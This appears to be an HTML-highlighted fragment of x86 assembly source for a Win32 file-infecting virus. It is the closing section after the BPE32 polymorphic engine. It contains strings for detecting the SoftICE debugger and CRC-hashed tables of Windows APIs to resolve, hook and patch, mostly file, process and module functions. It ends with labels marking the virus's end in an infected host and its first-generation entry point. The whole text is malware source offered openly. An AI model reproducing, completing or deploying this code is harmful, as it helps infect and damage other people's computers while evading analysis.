</span><span class="sc5">BPE32</span><span class="sc0">     </span><span class="sc9">EndP</span><span class="sc0">          </span><span class="sc1">;BPE32 ends here</span><span class="sc0">


</span><span class="sc5">szK32</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'KERNEL32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;name of DLL</span><span class="sc0">
</span><span class="sc5">sice95</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\\.\SICE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;SoftICE/95/98</span><span class="sc0">
</span><span class="sc5">siceNT</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\\.\NTICE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;SoftICE/NT</span><span class="sc0">
</span><span class="sc1">;APIs needed at run-time</span><span class="sc0">
</span><span class="sc5">crcAPIs</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0AE17EBEFh</span><span class="sc0">      </span><span class="sc1">;FindFirstFileA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0AA700106h</span><span class="sc0">      </span><span class="sc1">;FindNextFileA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0C200BE21h</span><span class="sc0">      </span><span class="sc1">;FindClose</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">03C19E536h</span><span class="sc0">      </span><span class="sc1">;SetFileAttributesA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">04B2A3E7Dh</span><span class="sc0">      </span><span class="sc1">;SetFileTime</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">08C892DDFh</span><span class="sc0">      </span><span class="sc1">;CreateFileA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">096B2D96Ch</span><span class="sc0">      </span><span class="sc1">;CreateFileMappingA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0797B49ECh</span><span class="sc0">      </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">094524B42h</span><span class="sc0">      </span><span class="sc1">;UnmapViewOfFile</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">019F33607h</span><span class="sc0">      </span><span class="sc1">;CreateThread</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0D4540229h</span><span class="sc0">      </span><span class="sc1">;WaitForSingleObject</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">068624A9Dh</span><span class="sc0">      </span><span class="sc1">;CloseHandle</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">020B943E7h</span><span class="sc0">      </span><span class="sc1">;CreateMutexA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0C449CF4Eh</span><span class="sc0">      </span><span class="sc1">;ReleaseMutex</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0C6F22166h</span><span class="sc0">      </span><span class="sc1">;OpenMutexA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00AC136BAh</span><span class="sc0">      </span><span class="sc1">;Sleep</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">079C3D4BBh</span><span class="sc0">      </span><span class="sc1">;VirtualProtect</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0EB1CE85Ch</span><span class="sc0">      </span><span class="sc1">;GetCurrentProcessId</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">033D350C4h</span><span class="sc0">      </span><span class="sc1">;OpenProcess</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">041A050AFh</span><span class="sc0">      </span><span class="sc1">;TerminateProcess</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">04134D1ADh</span><span class="sc0">      </span><span class="sc1">;LoadLibraryA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0FFC97C1Fh</span><span class="sc0">      </span><span class="sc1">;GetProcAddress</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0AFDF191Fh</span><span class="sc0">      </span><span class="sc1">;FreeLibrary</span><span class="sc0">

</span><span class="sc1">;APIs to hook</span><span class="sc0">
</span><span class="sc5">crchAPIs</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0AE17EBEFh</span><span class="sc0">      </span><span class="sc1">;FindFirstFileA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0AA700106h</span><span class="sc0">      </span><span class="sc1">;FindNextFileA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">05BD05DB1h</span><span class="sc0">      </span><span class="sc1">;CopyFileA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0953F2B64h</span><span class="sc0">      </span><span class="sc1">;CopyFileExA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">08C892DDFh</span><span class="sc0">      </span><span class="sc1">;CreateFileA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0267E0B05h</span><span class="sc0">      </span><span class="sc1">;CreateProcessA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0DE256FDEh</span><span class="sc0">      </span><span class="sc1">;DeleteFileA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0C633D3DEh</span><span class="sc0">      </span><span class="sc1">;GetFileAttributesA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">08F48B20Dh</span><span class="sc0">      </span><span class="sc1">;GetFullPathNameA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0F2F886E3h</span><span class="sc0">      </span><span class="sc1">;_lopen</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">02308923Fh</span><span class="sc0">      </span><span class="sc1">;MoveFileA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">03BE43958h</span><span class="sc0">      </span><span class="sc1">;MoveFileExA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">068D8FC46h</span><span class="sc0">      </span><span class="sc1">;OpenFile</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">03C19E536h</span><span class="sc0">      </span><span class="sc1">;SetFileAttributesA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">028452C4Fh</span><span class="sc0">      </span><span class="sc1">;WinExec</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">040F57181h</span><span class="sc0">      </span><span class="sc1">;ExitProcess</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0058F9201h</span><span class="sc0">      </span><span class="sc1">;ExitThread</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">087D52C94h</span><span class="sc0">      </span><span class="sc1">;GetLastError</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">068624A9Dh</span><span class="sc0">      </span><span class="sc1">;CloseHandle</span><span class="sc0">

</span><span class="sc1">;APIs to patch</span><span class="sc0">
</span><span class="sc5">crcpAPIs</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0E141042Ah</span><span class="sc0">      </span><span class="sc1">;GetProcessHeap</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">042F13D06h</span><span class="sc0">      </span><span class="sc1">;GetVersion</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0DE5C074Ch</span><span class="sc0">      </span><span class="sc1">;GetVersionEx</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">052CA6A8Dh</span><span class="sc0">      </span><span class="sc1">;GetStartupInfoA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">04E52DF5Ah</span><span class="sc0">      </span><span class="sc1">;GetStartupInfoW</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">03921BF03h</span><span class="sc0">      </span><span class="sc1">;GetCommandLineA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">025B90AD4h</span><span class="sc0">      </span><span class="sc1">;GetCommandLineW</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">003690E66h</span><span class="sc0">      </span><span class="sc1">;GetCurrentProcess</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">019F33607h</span><span class="sc0">      </span><span class="sc1">;CreateThread</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">082B618D4h</span><span class="sc0">      </span><span class="sc1">;GetModuleHandleA</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">09E2EAD03h</span><span class="sc0">      </span><span class="sc1">;GetModuleHandleW</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;end of virus in host</span><span class="sc0">

</span><span class="sc5">tmp</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;temporary variable</span><span class="sc0">
            </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0">             </span><span class="sc1">;overlay</span><span class="sc0">
</span><span class="sc5">WFD</span><span class="sc0">     </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;Win32 Find Data</span><span class="sc0">
</span><span class="sc5">WFD2</span><span class="sc0">        </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;Win32 Find Data</span><span class="sc0">
</span><span class="sc5">data_buffer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;buffer for VLCB_TData</span><span class="sc0">
</span><span class="sc5">size_unint</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc0">              </span><span class="sc1">;size of unitialized</span><span class="sc0">
                            </span><span class="sc1">;variables</span><span class="sc0">

</span><span class="sc1">;used only by first generation of virus</span><span class="sc0">
</span><span class="sc5">workspace1</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;usd by compression</span><span class="sc0">
</span><span class="sc5">workspace2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;engine</span><span class="sc0">
</span><span class="sc5">_GetModuleHandleA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">                            </span><span class="sc1">;end of code section</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">first_gen</span><span class="sc0">                       </span><span class="sc1">;end of virus</span><span class="sc0">
</span></div></body>
</html>
